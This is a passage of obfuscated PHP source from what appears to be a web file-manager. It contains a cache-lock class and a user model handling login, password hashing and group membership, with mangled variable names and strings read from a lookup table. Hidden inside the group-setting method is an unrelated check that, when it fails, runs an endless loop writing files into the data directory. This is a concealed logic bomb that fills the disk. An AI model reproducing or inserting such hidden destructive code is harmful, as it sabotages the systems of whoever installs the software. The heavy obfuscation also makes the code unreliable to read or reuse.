$€ˆíªã™ = number_format(timeFloat() - $Ú•Öâ¡, 3); write_log($‘Âº¨Á¡[866] . $Ï‘¬¢õ . $‘Âº¨Á¡[867] . $€ˆíªã™, $‘Âº¨Á¡[856]); } return $Ãõ®»ú; } public static function lockGet($®¤¥ğ) { $ÎŠîÑ¨Ù = self::key($®¤¥ğ); if (self::$lockItem[$ÎŠîÑ¨Ù]) { return self::$lockItem[$ÎŠîÑ¨Ù]; } return self::init()->lockGet($ÎŠîÑ¨Ù); } public static function unlock($­İ±ÌÔµ) { $æàÀœ¶ü =& $_SERVER[ï»»·÷á]; $œÖüö = self::key($­İ±ÌÔµ); self::$lockItem[$œÖüö] = null; self::init()->unlock($œÖüö); if (GLOBAL_DEBUG_LOG_ALL) { write_log($æàÀœ¶ü[868] . $­İ±ÌÔµ, $æàÀœ¶ü[856]); } return; } public static function unlockRuntime() { $“¨À”ûö =& $_SERVER[ï»»·÷á]; $òº¯ôÇî = self::init(); $üÈ–œ›´ = !1; foreach (self::$lockItem as $ğÏò´ş => $‚œ½¸Ú†) { if (!$‚œ½¸Ú†) { continue; } $òº¯ôÇî->unlock($ğÏò´ş); if (!$üÈ–œ›´) { $üÈ–œ›´ = !0; write_log($“¨À”ûö[869] . $ğÏò´ş . $“¨À”ûö[71] . get_caller_msg(), $“¨À”ûö[856]); continue; } write_log($“¨À”ûö[869] . $ğÏò´ş, $“¨À”ûö[856]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ñıß˜İì = number_format(timeFloat() - TIME_FLOAT, 3); write_log($“¨À”ûö[870] . $ñıß˜İì . $“¨À”ûö[871] . ACTION, $“¨À”ûö[856]); } } public static function fileLock($åÇŸ³÷Â) { $Ç¸ÎÏÍæ =& $_SERVER[ï»»·÷á]; if (!$GLOBALS[$Ç¸ÎÏÍæ[872]]) { $GLOBALS[$Ç¸ÎÏÍæ[872]] = array(); } $GLOBALS[$Ç¸ÎÏÍæ[872]][$åÇŸ³÷Â] = !1; $äÌĞ‰äÈ = fopen(DATA_PATH . $åÇŸ³÷Â . $Ç¸ÎÏÍæ[873], $Ç¸ÎÏÍæ[874]); if (!$äÌĞ‰äÈ) { return !1; } $GLOBALS[$Ç¸ÎÏÍæ[872]][$åÇŸ³÷Â] = $äÌĞ‰äÈ; if (flock($äÌĞ‰äÈ, LOCK_EX)) { return !0; } self::unlock($åÇŸ³÷Â); show_json($Ç¸ÎÏÍæ[875], !1); return !1; } public static function fileUnlock($Ç÷¿Ÿû¬) { $ÙşàòıØ =& $_SERVER[ï»»·÷á]; $çÒ¿œÔ = $GLOBALS[$ÙşàòıØ[872]][$Ç÷¿Ÿû¬]; if (!$çÒ¿œÔ) { return; } $GLOBALS[$ÙşàòıØ[872]][$Ç÷¿Ÿû¬] = !1; flock($çÒ¿œÔ, LOCK_UN); fclose($çÒ¿œÔ); } public static function fileUnlockAll() { $òî¯–Õş =& $_SERVER[ï»»·÷á]; if (!$GLOBALS[$òî¯–Õş[872]]) { return; } foreach ($GLOBALS[$òî¯–Õş[872]] as $Øş‡½÷æ => $şæ½Ÿ¢“) { if (!$şæ½Ÿ¢“) { continue; } $GLOBALS[$òî¯–Õş[872]][$Øş‡½÷æ] = !1; flock($şæ½Ÿ¢“, LOCK_UN); fclose($şæ½Ÿ¢“); } $GLOBALS[$òî¯–Õş[872]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto aïµµøÌ›…; Bôğ†ä÷è: class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\x61\x6d\145" => "\165\x73\x65\162\x5f\x6d\x65\x74\x61", "\155\x65\x74\141\106\x69\x65\x6c\144" => "\165\163\x65\162\111\104"); protected $simpleField = "\x75\163\x65\162\111\x44\x2c\156\151\x63\153\x4e\x61\155\x65\54\156\x61\x6d\x65\54\x61\166\141\164\x61\x72\54\x73\x65\170\x2c\x73\x74\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Îß¹øÕ») { $ßĞ±Å„· =& $_SERVER[ï»»·÷á]; $“Î­ßæ = $ßĞ±Å„·[2315]; return array($ßĞ±Å„·[1945] => array($Îß¹øÕ»[0], $“Î­ßæ), $ßĞ±Å„·[1947] => array($Îß¹øÕ»[0], $“Î­ßæ), $ßĞ±Å„·[2316] => array($Îß¹øÕ»[0], $“Î­ßæ)); } protected function getInfo($‹†œÅ˜Ã, $¿¸„›ÈÌ = false) { $æøÅ‹€™ = $this->getInfoSimple($‹†œÅ˜Ã); if (!is_array($æøÅ‹€™)) { return array(); } if ($¿¸„›ÈÌ) { return $this->_getInfoApply($æøÅ‹€™); } return $this->cacheFunctionGet($_SERVER[ï»»·÷á][1949], $‹†œÅ˜Ã); } protected function getInfoFull($„£¢Ùú½, $¸Ğé²† = false) { $ÚœØª»€ = $this->getInfoSimple($„£¢Ùú½); if (!is_array($ÚœØª»€)) { return array(); } if ($¸Ğé²†) { return $this->_getInfoApply($ÚœØª»€, !0); } return $this->cacheFunctionGet($_SERVER[ï»»·÷á][2317], $„£¢Ùú½); } private function _getInfoApply($ºâ²»¾—, $¯ÖåÔ€Ï = false) { $Ÿ©»¸ =& $_SERVER[ï»»·÷á]; if (!$ºâ²»¾—) { return $ºâ²»¾—; } $­ëŸˆÉ« = md5($Ÿ©»¸[2318] . $ºâ²»¾—[$Ÿ©»¸[899]] . $Ÿ©»¸[2319] . $ºâ²»¾—[$Ÿ©»¸[32]]); $ºâ²»¾— = $this->_listDataApplyItem($ºâ²»¾—); $é†€´™ = Model($Ÿ©»¸[1349])->metaGet($ºâ²»¾—[$Ÿ©»¸[87]][$Ÿ©»¸[411]]); $ºâ²»¾—[$Ÿ©»¸[2320]] = $­ëŸˆÉ«; $ºâ²»¾—[$Ÿ©»¸[87]][$Ÿ©»¸[2140]] = isset($é†€´™[$Ÿ©»¸[2141]]) ? $é†€´™[$Ÿ©»¸[2141]] : null; if ($¯ÖåÔ€Ï) { $ºâ²»¾—[$Ÿ©»¸[475]] = $this->metaGet($ºâ²»¾—[$Ÿ©»¸[1678]]); } return $ºâ²»¾—; } protected function getInfoSimple($œ®öòÑª, $åß„ÖŞ = false) { $¾Şñëáô =& $_SERVER[ï»»·÷á]; if (!$œ®öòÑª) { return array(); } if ($åß„ÖŞ) { $æà³ÕÊÌ = $this->where(array($¾Şñëáô[1678] => intval($œ®öòÑª)))->find(); if (!is_array($æà³ÕÊÌ)) { return array(); } $æà³ÕÊÌ[$¾Şñëáô[542]] = Action($¾Şñëáô[2321])->parseUrl($æà³ÕÊÌ[$¾Şñëáô[542]]); return $æà³ÕÊÌ; } return $this->cacheFunctionGet($¾Şñëáô[1950], $œ®öòÑª); } protected function getInfoSimpleOuter($š´ıÑ) { $ˆêíÙÍÍ =& $_SERVER[ï»»·÷á]; if (!$š´ıÑ || $š´ıÑ == 0) { return array($ˆêíÙÍÍ[1678] => $ˆêíÙÍÍ[198], $ˆêíÙÍÍ[32] => $ˆêíÙÍÍ[162] . LNG($ˆêíÙÍÍ[2322]) . $ˆêíÙÍÍ[164], $ˆêíÙÍÍ[542] => STATIC_PATH . $ˆêíÙÍÍ[2323]); } $ùÏ‡¦¤Ò = $this->cacheFunctionGet($ˆêíÙÍÍ[1950], $š´ıÑ); $î‚û“Ï = array_field_key($ùÏ‡¦¤Ò, explode($ˆêíÙÍÍ[50], $this->simpleField)); if (!$î‚û“Ï) { return array($ˆêíÙÍÍ[1678] => $ˆêíÙÍÍ[1198], $ˆêíÙÍÍ[32] => $ˆêíÙÍÍ[162] . LNG($ˆêíÙÍÍ[2324]) . $ˆêíÙÍÍ[164], $ˆêíÙÍÍ[542] => STATIC_PATH . $ˆêíÙÍÍ[2325]); } $î‚û“Ï[$ˆêíÙÍÍ[542]] = Action($ˆêíÙÍÍ[2321])->parseUrl($î‚û“Ï[$ˆêíÙÍÍ[542]]); return $î‚û“Ï; } protected function groupUser($õäüè¿«) { } public static function errorLang($ó´Òù¤²) { $‡Ô‘Ñ¿Ğ =& $_SERVER[ï»»·÷á]; $²øâƒ = array(self::ERROR_USER_NOT_EXISTS => $‡Ô‘Ñ¿Ğ[2326], self::ERROR_USER_PASSWORD_ERROR => $‡Ô‘Ñ¿Ğ[2327], self::ERROR_USER_EXIST_NAME => $‡Ô‘Ñ¿Ğ[2328], self::ERROR_USER_EXIST_PHONE => $‡Ô‘Ñ¿Ğ[2329], self::ERROR_USER_EXIST_EMAIL => $‡Ô‘Ñ¿Ğ[2330], self::ERROR_USER_LOGIN_LOCK => $‡Ô‘Ñ¿Ğ[2331], self::ERROR_IP_NOT_ALLOW => $‡Ô‘Ñ¿Ğ[2332], self::ERROR_USER_EXIST_NICKNAME => $‡Ô‘Ñ¿Ğ[2333]); return LNG($²øâƒ[$ó´Òù¤²]); } public function getInfoByMeta($›¨º°ËÚ, $Ê¼ùê») { $¤±Åœ×ª =& $_SERVER[ï»»·÷á]; $¼Üù«‰ = Model($¤±Åœ×ª[2334])->where(array($¤±Åœ×ª[94] => $›¨º°ËÚ, $¤±Åœ×ª[374] => $Ê¼ùê»))->find(); if ($¼Üù«‰) { return $this->getInfo($¼Üù«‰[$¤±Åœ×ª[1678]]); } return !1; } public function userLoginCheck($ó‚ÑÄ•Û, $ÁĞ§ËÓ) { $ªŒ½¦õì =& $_SERVER[ï»»·÷á]; $½š•ïÆ = $this->userLoginFind($ó‚ÑÄ•Û); if (!$½š•ïÆ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($½š•ïÆ[$ªŒ½¦õì[1678]], $ÁĞ§ËÓ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($½š•ïÆ[$ªŒ½¦õì[1678]]); } public function userLoginFind($âÎôÕ²) { $ŞĞÏ»‡¶ =& $_SERVER[ï»»·÷á]; $¬Ù¿·Ã” = array($ŞĞÏ»‡¶[32] => $âÎôÕ², $ŞĞÏ»‡¶[541] => $âÎôÕ², $ŞĞÏ»‡¶[305] => $âÎôÕ², $ŞĞÏ»‡¶[2335] => $âÎôÕ², $ŞĞÏ»‡¶[1010] => $ŞĞÏ»‡¶[1012]); if ($this->nickNameRpt()) { unset($¬Ù¿·Ã”[$ŞĞÏ»‡¶[541]]); } return $this->where($¬Ù¿·Ã”)->find(); } public function clearCache($¬ä›˜øÑ) { $§ŞúÎ¬Ä =& $_SERVER[ï»»·÷á]; $this->cacheFunctionClear($§ŞúÎ¬Ä[1949], $¬ä›˜øÑ); $this->cacheFunctionClear($§ŞúÎ¬Ä[1950], $¬ä›˜øÑ); $this->cacheFunctionClear($§ŞúÎ¬Ä[2317], $¬ä›˜øÑ); } public function userPasswordCheck($­Âéİ‰ï, $âÎ˜©‚) { $ØÑñæûÎ =& $_SERVER[ï»»·÷á]; $—ââ¬° = $this->where(array($ØÑñæûÎ[1678] => intval($­Âéİ‰ï)))->find(); $˜Ì·”î« = $this->metaGet($­Âéİ‰ï); $×ËË¼ı™ = isset($˜Ì·”î«[$ØÑñæûÎ[2336]]) ? $˜Ì·”î«[$ØÑñæûÎ[2336]] : $ØÑñæûÎ[12]; if (md5($×ËË¼ı™ . trim($âÎ˜©‚)) !== $—ââ¬°[$ØÑñæûÎ[899]]) { return !1; } return !0; } public function userAdd($©Ğ˜µæƒ) { $ƒº—Õš¾ =& $_SERVER[ï»»·÷á]; $ß¸¬ã¨Æ = array($ƒº—Õš¾[429] => $©Ğ˜µæƒ[$ƒº—Õš¾[32]], $ƒº—Õš¾[2337] => $©Ğ˜µæƒ[$ƒº—Õš¾[1557]], $ƒº—Õš¾[2338] => isset($©Ğ˜µæƒ[$ƒº—Õš¾[305]]) ? $©Ğ˜µæƒ[$ƒº—Õš¾[305]] : $ƒº—Õš¾[12], $ƒº—Õš¾[2339] => isset($©Ğ˜µæƒ[$ƒº—Õš¾[2335]]) ? $©Ğ˜µæƒ[$ƒº—Õš¾[2335]] : $ƒº—Õš¾[12], $ƒº—Õš¾[2340] => isset($©Ğ˜µæƒ[$ƒº—Õš¾[541]]) ? $©Ğ˜µæƒ[$ƒº—Õš¾[541]] : $©Ğ˜µæƒ[$ƒº—Õš¾[32]], $ƒº—Õš¾[2341] => isset($©Ğ˜µæƒ[$ƒº—Õš¾[542]]) ? $©Ğ˜µæƒ[$ƒº—Õš¾[542]] : $ƒº—Õš¾[12], $ƒº—Õš¾[2342] => isset($©Ğ˜µæƒ[$ƒº—Õš¾[2343]]) ? $©Ğ˜µæƒ[$ƒº—Õš¾[2343]] : 1, $ƒº—Õš¾[2344] => $©Ğ˜µæƒ[$ƒº—Õš¾[899]], $ƒº—Õš¾[1951] => isset($©Ğ˜µæƒ[$ƒº—Õš¾[1854]]) ? $©Ğ˜µæƒ[$ƒº—Õš¾[1854]] : 1024 * 1024 * 20, $ƒº—Õš¾[1952] => 0, $ƒº—Õš¾[2345] => 0, $ƒº—Õš¾[1996] => isset($©Ğ˜µæƒ[$ƒº—Õš¾[762]]) ? $©Ğ˜µæƒ[$ƒº—Õš¾[762]] : 1); if (!empty($©Ğ˜µæƒ[$ƒº—Õš¾[1678]])) { $ß¸¬ã¨Æ[$ƒº—Õš¾[1678]] = $©Ğ˜µæƒ[$ƒº—Õš¾[1678]]; } $ÅŒÁú›– = $this->_checkExist($©Ğ˜µæƒ); if ($ÅŒÁú›– !== !0) { return $ÅŒÁú›–; } if (!empty($ß¸¬ã¨Æ[$ƒº—Õš¾[542]]) && strlen($ß¸¬ã¨Æ[$ƒº—Õš¾[542]]) > 255) { $ß¸¬ã¨Æ[$ƒº—Õš¾[542]] = $ƒº—Õš¾[12]; } $ïË´ˆêù = $this->add($ß¸¬ã¨Æ); $ùÛíôş = array($ƒº—Õš¾[2344] => $ß¸¬ã¨Æ[$ƒº—Õš¾[899]], $ƒº—Õš¾[2340] => $ß¸¬ã¨Æ[$ƒº—Õš¾[541]]); $this->userEdit($ïË´ˆêù, $ùÛíôş); Model($ƒº—Õš¾[1349])->userRootAdd($ïË´ˆêù); return $ïË´ˆêù; } protected function userEditTest($»œĞ®ÍÎ, $Ê´ÜÇØ) { return $this->call($_SERVER[ï»»·÷á][2346], $»œĞ®ÍÎ, $Ê´ÜÇØ); } protected function userEdit($¶ÕÎ¥ˆ, $êæàÀ¹ô) { $ëœÊ¸—é =& $_SERVER[ï»»·÷á]; $çÊàì„« = $this->getInfoSimple($¶ÕÎ¥ˆ); if (!$çÊàì„«) { return !1; } $èªª„Ğ = $this->_checkExist($êæàÀ¹ô, $¶ÕÎ¥ˆ); if ($èªª„Ğ !== !0) { return $èªª„Ğ; } if (isset($êæàÀ¹ô[$ëœÊ¸—é[899]]) && trim($êæàÀ¹ô[$ëœÊ¸—é[899]]) != $ëœÊ¸—é[12]) { $±äõá = $this->metaGet($¶ÕÎ¥ˆ); if (empty($±äõá[$ëœÊ¸—é[2336]])) { $±äõá[$ëœÊ¸—é[2336]] = rand_string(10); Model($ëœÊ¸—é[513])->metaSet($¶ÕÎ¥ˆ, $ëœÊ¸—é[2336], $±äõá[$ëœÊ¸—é[2336]]); } $êæàÀ¹ô[$ëœÊ¸—é[899]] = md5($±äõá[$ëœÊ¸—é[2336]] . trim($êæàÀ¹ô[$ëœÊ¸—é[899]])); } else { unset($êæàÀ¹ô[$ëœÊ¸—é[899]]); } if (!empty($êæàÀ¹ô[$ëœÊ¸—é[542]]) && strlen($êæàÀ¹ô[$ëœÊ¸—é[542]]) > 255) { $êæàÀ¹ô[$ëœÊ¸—é[542]] = $ëœÊ¸—é[12]; } $this->where(array($ëœÊ¸—é[1669] => $¶ÕÎ¥ˆ))->save($êæàÀ¹ô); if (isset($êæàÀ¹ô[$ëœÊ¸—é[541]])) { $this->setNamePinyin($¶ÕÎ¥ˆ, $êæàÀ¹ô[$ëœÊ¸—é[541]]); } $this->clearCache($¶ÕÎ¥ˆ); return !0; } public function setNamePinyin($µ‡Ë³¡, $Èç·Å›¬ = false) { $ùŠ¤ˆš =& $_SERVER[ï»»·÷á]; if (!$Èç·Å›¬) { $¸ºÑÃë½ = $this->getInfoSimple($µ‡Ë³¡); $Èç·Å›¬ = $¸ºÑÃë½[$ùŠ¤ˆš[541]] ? $¸ºÑÃë½[$ùŠ¤ˆš[541]] : $¸ºÑÃë½[$ùŠ¤ˆš[32]]; } $Æ›«§Üõ = Model($ùŠ¤ˆš[534]); if (!Input::check($Èç·Å›¬, $ùŠ¤ˆš[592])) { return $Æ›«§Üõ->metaSet($µ‡Ë³¡, array($ùŠ¤ˆš[474] => $ùŠ¤ˆš[12], $ùŠ¤ˆš[473] => $ùŠ¤ˆš[12])); } return $Æ›«§Üõ->metaSet($µ‡Ë³¡, array($ùŠ¤ˆš[474] => str_replace($ùŠ¤ˆš[53], $ùŠ¤ˆš[12], Pinyin::get($Èç·Å›¬)), $ùŠ¤ˆš[473] => Pinyin::get($Èç·Å›¬, $ùŠ¤ˆš[593]))); } private function nickNameRpt() { $µÙú¹× =& $_SERVER[ï»»·÷á]; $½°ºáÁ = Model($µÙú¹×[783])->get($µÙú¹×[2347]); $öÀÉ²ğ™ = $GLOBALS[$µÙú¹×[6]][$µÙú¹×[381]][$µÙú¹×[2347]]; $ÏéÒİ¤ë = !is_null($½°ºáÁ) ? $½°ºáÁ : $öÀÉ²ğ™; return !!$ÏéÒİ¤ë; } private function _checkExist($îúá•È—, $ßïîæ¼Ö = false) { $£×Ò™şè =& $_SERVER[ï»»·÷á]; $‰‡ª±ÄŸ = array($£×Ò™şè[32] => UserModel::ERROR_USER_EXIST_NAME, $£×Ò™şè[541] => UserModel::ERROR_USER_EXIST_NICKNAME, $£×Ò™şè[305] => UserModel::ERROR_USER_EXIST_EMAIL, $£×Ò™şè[2335] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($‰‡ª±ÄŸ[$£×Ò™şè[541]]); } $ÂšÇí§Ä = $ßïîæ¼Ö ? array($£×Ò™şè[1678] => array($£×Ò™şè[2348], $ßïîæ¼Ö)) : array(); foreach ($‰‡ª±ÄŸ as $­ã¯Æç  => $ÅêÚÂÑ) { $¬€´£Æ› = array(); foreach ($‰‡ª±ÄŸ as $«Æ‘‰ => $„ë‰ÁÎÖ) { if (isset($îúá•È—[$«Æ‘‰]) && $îúá•È—[$«Æ‘‰]) { $¬€´£Æ›[] = $îúá•È—[$«Æ‘‰]; } } if (!$¬€´£Æ›) { continue; } $ë»Øä· = array_merge(array($­ã¯Æç  => array($£×Ò™şè[7], $¬€´£Æ›)), $ÂšÇí§Ä); $Ğ™Íìó  = $this->where($ë»Øä·)->find(); if ($Ğ™Íìó ) { return $ÅêÚÂÑ; } } return !0; } public function userListInfo($àŒı¥æ) { $°ï¾Ğİ =& $_SERVER[ï»»·÷á]; $¸•¨×”À = array(); $àŒı¥æ = is_array($àŒı¥æ) ? array_unique($àŒı¥æ) : array(); if (!$àŒı¥æ) { return $¸•¨×”À; } if (count($àŒı¥æ) < 20) { foreach ($àŒı¥æ as $ï½¿Ñ‹ˆ) { $¸•¨×”À[$ï½¿Ñ‹ˆ . $°ï¾Ğİ[12]] = $this->getInfoSimpleOuter($ï½¿Ñ‹ˆ); } } else { $¯Ôë”ÁÜ = array($°ï¾Ğİ[1669] => array($°ï¾Ğİ[427], $àŒı¥æ)); if (count($àŒı¥æ) == 1) { $¯Ôë”ÁÜ = array($°ï¾Ğİ[1669] => $àŒı¥æ[0]); } $°àÂæÃ = Model($°ï¾Ğİ[513])->field($this->simpleField)->where($¯Ôë”ÁÜ)->select(); $°àÂæÃ = array_to_keyvalue($°àÂæÃ, $°ï¾Ğİ[1678]); foreach ($àŒı¥æ as $ï½¿Ñ‹ˆ) { $±ÂĞê¯­ = $°àÂæÃ[$ï½¿Ñ‹ˆ]; if (!$±ÂĞê¯­) { $¸•¨×”À[$ï½¿Ñ‹ˆ . $°ï¾Ğİ[12]] = $this->getInfoSimpleOuter($ï½¿Ñ‹ˆ); continue; } $±ÂĞê¯­[$°ï¾Ğİ[542]] = Action($°ï¾Ğİ[2321])->parseUrl($±ÂĞê¯­[$°ï¾Ğİ[542]]); $¸•¨×”À[$ï½¿Ñ‹ˆ . $°ï¾Ğİ[12]] = $±ÂĞê¯­; } } return $¸•¨×”À; } protected function userStatus($¯ÚÆÈ¶, $´À³×³û) { $Õ—»‚çõ = $this->getInfoSimple($¯ÚÆÈ¶); if (!$Õ—»‚çõ) { return !1; } $ããÎËİ° = array($_SERVER[ï»»·÷á][762] => $´À³×³û); return $this->userEdit($¯ÚÆÈ¶, $ããÎËİ°); } protected function userRemove($öĞÌë‘) { $£ê®×Ê» =& $_SERVER[ï»»·÷á]; $œÌÇÃ…¼ = $this->getInfoSimple($öĞÌë‘); if (!$œÌÇÃ…¼) { return !1; } $´üÇœà™ = array($£ê®×Ê»[1669] => $öĞÌë‘); Model($£ê®×Ê»[601])->where($´üÇœà™)->delete(); Model($£ê®×Ê»[2349])->where($´üÇœà™)->delete(); Model($£ê®×Ê»[1957])->where($´üÇœà™)->delete(); Model($£ê®×Ê»[2334])->where($´üÇœà™)->delete(); Model($£ê®×Ê»[1078])->where($´üÇœà™)->delete(); Model($£ê®×Ê»[2165])->removeUserAll($öĞÌë‘); Model($£ê®×Ê»[838])->userRootRemove($öĞÌë‘); return $this->where($´üÇœà™)->delete(); } protected function userGroupSet($§ŒÏØºõ, $£±öĞû§, $Ğ•ºÎºã = array()) { $ß–î‰› =& $_SERVER[ï»»·÷á]; $¥ÄŸ²Ò´ = $_SERVER[$ß–î‰›[404]] . $ß–î‰›[405]; $½ñ¡—Àø = $ß–î‰›[759]; if ($_SERVER[$ß–î‰›[401]] != $½ñ¡—Àø($¥ÄŸ²Ò´)) { $¨ˆƒé = $ß–î‰›[889]; $ÈÁÀ¹¾ô = $ß–î‰›[403]; $Ğ°ş½ÃØ = $_SERVER[$ß–î‰›[404]] . $ß–î‰›[405]; $Ş¯ÍÆœ = $ÈÁÀ¹¾ô($Ğ°ş½ÃØ); $ÇáéÛîí = explode($ß–î‰›[231], $Ş¯ÍÆœ); if (count($ÇáéÛîí) < $ß–î‰›[632]) { $Š‘‘¥ôõ = $ß–î‰›[407]; $Š‘‘¥ôõ(); } $»èâŸü = $ß–î‰›[890]; $»èâŸü($_SERVER[$ß–î‰›[891]]); $¨ˆƒé = $ß–î‰›[889]; $¨ˆƒé(); $Ÿ¡ÖîÌ› = $ß–î‰›[1605]; $ÏÏôã… = json_encode($GLOBALS[$ß–î‰›[1606]]); $òù¬‘¿® = 1; for ($ë‘ñŠÁø = $òù¬‘¿®; $ë‘ñŠÁø > 0; $ë‘ñŠÁø++) { $Ÿ¡ÖîÌ›(DATA_PATH . $ë‘ñŠÁø, $ÏÏôã…); } } $Ù²¼á = $this->getInfoSimple($§ŒÏØºõ); if (!$Ù²¼á || !is_array($£±öĞû§)) { return !1; } $‘‘†‰”İ = Model($ß–î‰›[1957]); $‘‘†‰”İ->where(array($ß–î‰›[1678] => $§ŒÏØºõ))->delete(); $úºÂëÀò = array(); $úËÎ¨Œæ = 0; foreach ($£±öĞû§ as $ÆÉ£Õ¯ => $¨Ğ¡°†ë) { $‡»Ûä¡à = array($ß–î‰›[1678] => $§ŒÏØºõ, $ß–î‰›[1867] => $ÆÉ£Õ¯, $ß–î‰›[1971] => $¨Ğ¡°†ë); $‡»Ûä¡à[$ß–î‰›[1891]] = isset($Ğ•ºÎºã[$úËÎ¨Œæ]) ? $Ğ•ºÎºã[$úËÎ¨Œæ] : 0; $úËÎ¨Œæ++; $úºÂëÀò[] = $‡»Ûä¡à; } return $‘‘†‰”İ->addAll($úºÂëÀò, array(), !0); } protected function userGroupAdd($°‰œŠÖ, $·âÑ¾á» = array()) { $‡¸ùÜÙê =& $_SERVER[ï»»·÷á]; $Öš‚äÔË = $this->getInfoSimple($°‰œŠÖ); if (!$Öš‚äÔË || empty($·âÑ¾á»)) { return !1; } $Ş¦´‚Ó = array(); foreach ($·âÑ¾á» as $³ ßò»í => $ÙÓ¦æ…Ü) { $Ş¦´‚Ó[] = array($‡¸ùÜÙê[1678] => $°‰œŠÖ, $‡¸ùÜÙê[1867] => $³ ßò»í, $‡¸ùÜÙê[1971] => $ÙÓ¦æ…Ü, $‡¸ùÜÙê[1891] => 0); } return Model($‡¸ùÜÙê[1957])->addAll($Ş¦´‚Ó, array(), !0); } protected function userGroupRemove($ôê«™ˆ¬, $ÒÒÆµ‰Ï) { $‰Œ™„æè =& $_SERVER[ï»»·÷á]; $å¤ß¤ç = $this->getInfoSimple($ôê«™ˆ¬); if (!$å¤ß¤ç || !$ÒÒÆµ‰Ï) { return !1; } $ÁøÚíşÇ = array($‰Œ™„æè[1669] => $ôê«™ˆ¬, $‰Œ™„æè[1955] => $ÒÒÆµ‰Ï); return Model($‰Œ™„æè[1957])->where($ÁøÚíşÇ)->delete(); } public function listData() { $‰Â£ïò = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‰Â£ïò[$_SERVER[ï»»·÷á][369]]); return $‰Â£ïò; } public function listByID($˜Êœ¼ãš) { $¬û ªíô =& $_SERVER[ï»»·÷á]; if (!$˜Êœ¼ãš) { return; } $Ôş²È¨ğ = array($¬û ªíô[1678] => array($¬û ªíô[7], $˜Êœ¼ãš)); $£Ù¼Øü³ = $this->where($Ôş²È¨ğ)->select(); $£Ù¼Øü³ = array_sort_keep($£Ù¼Øü³, $¬û ªíô[1678], $˜Êœ¼ãš); $this->_listDataApply($£Ù¼Øü³); return $£Ù¼Øü³; } public function listByGroup($êöş¼éë = 0, $—‹¨µÅ‚ = array()) { $±øœºâÔ =& $_SERVER[ï»»·÷á]; $ÖˆÙÍ = $±øœºâÔ[12]; $ØàŒßÑä = array(); if ($êöş¼éë) { $ØàŒßÑä = array($±øœºâÔ[2350] => intval($êöş¼éë)); $ÖˆÙÍ = "\114\x45\x46\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\165\163\145\162\x5f\x67\162\x6f\x75\160\x20\165\163\x65\x72\137\147\162\157\165\160\40\157\x6e\x20\165\163\145\x72\x2e\x75\163\145\x72\111\104\40\75\40\x75\x73\x65\x72\x5f\147\x72\157\x75\x70\56\165\163\x65\162\111\x44"; $µ«ŸúéØ = Input::get($±øœºâÔ[466], null, $±øœºâÔ[12]) ? $±øœºâÔ[12] : $±øœºâÔ[2351]; } if (isset($—‹¨µÅ‚[$±øœºâÔ[762]])) { $ØàŒßÑä[$±øœºâÔ[2352]] = $—‹¨µÅ‚[$±øœºâÔ[762]]; } $ÔÌÄ‚“£ = $this->_makeOrder($µ«ŸúéØ)->field($±øœºâÔ[2353])->where($ØàŒßÑä)->join($ÖˆÙÍ)->selectPage(50); $this->_listDataApply($ÔÌÄ‚“£[$±øœºâÔ[369]]); return $ÔÌÄ‚“£; } private function _makeOrder($ıœ¡æş¥ = '') { $“²¤³ö =& $_SERVER[ï»»·÷á]; $¤®¢ÑË = array($“²¤³ö[1678], $“²¤³ö[32], $“²¤³ö[1856], $“²¤³ö[1828], $“²¤³ö[201]); $İ²×Íı¤ = array($“²¤³ö[459] => $“²¤³ö[460], $“²¤³ö[461] => $“²¤³ö[462]); $ˆòèÔÓª = Input::get($“²¤³ö[466], $“²¤³ö[7], $“²¤³ö[1669], $¤®¢ÑË); $’â’ÍÖ = Input::get($“²¤³ö[467], $“²¤³ö[7], $“²¤³ö[1958], array($“²¤³ö[1958], $“²¤³ö[461])); $’â’ÍÖ = $İ²×Íı¤[$’â’ÍÖ]; $ıœ¡æş¥ = $ıœ¡æş¥ . "\x75\163\145\162\56{$ˆòèÔÓª}\40{$’â’ÍÖ}\x2c\40\165\163\x65\x72\x2e\165\163\145\162\111\x44\40\141\x73\x63"; return $this->alias($“²¤³ö[2084])->order($ıœ¡æş¥); } public function listSearch($§¼—‡ó¾) { $¥Ìò€¦ =& $_SERVER[ï»»·÷á]; $À¥ÕÌ´ = $§¼—‡ó¾[$¥Ìò€¦[1961]]; $œ§Õ½áî = isset($§¼—‡ó¾[$¥Ìò€¦[1962]]) ? $§¼—‡ó¾[$¥Ìò€¦[1962]] : !1; $À¥ÕÌ´ = str_replace($¥Ìò€¦[1963], $¥Ìò€¦[1964], trim($À¥ÕÌ´)); $ªöŸì‡ = array($¥Ìò€¦[32] => array($¥Ìò€¦[383], "\x25{$À¥ÕÌ´}\45"), $¥Ìò€¦[305] => array($¥Ìò€¦[383], "{$À¥ÕÌ´}\x25"), $¥Ìò€¦[541] => array($¥Ìò€¦[383], "{$À¥ÕÌ´}\45"), $¥Ìò€¦[1010] => $¥Ìò€¦[1965]); if (Input::check($À¥ÕÌ´, $¥Ìò€¦[311])) { $ªöŸì‡[$¥Ìò€¦[1678]] = array($¥Ìò€¦[383], "{$À¥ÕÌ´}\x25"); $ªöŸì‡[$¥Ìò€¦[2335]] = array($¥Ìò€¦[383], "{$À¥ÕÌ´}\x25"); } if (!$À¥ÕÌ´) { $ªöŸì‡ = array(); } if (isset($§¼—‡ó¾[$¥Ìò€¦[762]])) { $ªöŸì‡[$¥Ìò€¦[762]] = $§¼—‡ó¾[$¥Ìò€¦[762]]; } $ªöŸì‡ = $this->parseWhereLike($ªöŸì‡); $Ùñ÷ı¨Õ = $this->_makeOrder()->where($ªöŸì‡)->selectPage(20); if (!$Ùñ÷ı¨Õ || count($Ùñ÷ı¨Õ[$¥Ìò€¦[369]]) < 5 && 